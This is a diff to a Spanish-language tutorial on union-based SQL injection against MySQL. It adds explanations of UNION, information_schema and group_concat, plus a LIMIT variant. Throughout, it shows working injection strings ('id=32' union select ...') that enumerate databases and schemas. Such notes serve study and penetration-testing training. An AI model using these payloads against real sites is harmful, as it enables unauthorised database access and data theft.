@@ -8,9 +8,11 @@ Una vez vimos la cantidad de columnas que existen empezamos con el uso de union 
 ```sql
 id=3' union select 1
 ```
+La cláusula UNION en SQL se utiliza para combinar los resultados de dos o más consultas SELECT.
+En este caso, se intenta combinar los resultados de la consulta original con los resultados de una nueva consulta que el atacante introduce.
 
 Esto nos tendria que mostrar el dato que esta almacenado en la primer columna de la tabla.
-Pero si en vez de poner un identificador valido, ponemos unos no valido nos va a empezar a reflejar lo que ponemos, y ahi es cuando podemos  empezar a eejcutar de todo.  
+Pero si en vez de poner un identificador valido, ponemos unos no valido nos va a empezar a reflejar lo que ponemos, y ahi es cuando podemos  empezar a ejecutar de todo.  
 ```sql
 id=32' union select database();
 ```
@@ -19,10 +21,16 @@ Con este comando le pedimos que nos liste todas las bases de datos existentes.
 ```sql
 id=32' union select schema_name from information_schema.schemata-- -
 ```
+- **schema_name** --->   columna en la tabla schemata dentro del esquema information_schema. Esta columna contiene los nombres de todas las bases de datos (schemas) en el servidor.
+- **information_schema** ---> Esquema especial en MySQL que contiene vistas de metadatos 
+- **schemata** ---> Es una tabla dentro del esquema information_schema
 
-El problema es que a veces los resultados terminan siendo limitados. Para evitar eso es mejor jugar con la funcion group_concat().
+
+El problema es que a veces los resultados terminan siendo limitados. Para evitar eso es mejor jugar con la funcion group_concat() o con limits.
+**group_concat** ---> Función que concatena los nombres de todas las tablas en una única cadena, separada por comas.
 ```sql
 id=32' union select group_concat(schema_name) from information_schema.schemata-- -
+id=32' union select schema_name from information_schema.schemata limit 0,1-- -
 ```
 
 Luego, para enumerar las tablas de cierta base de datos podriamos ejecutar el siguiente comando.
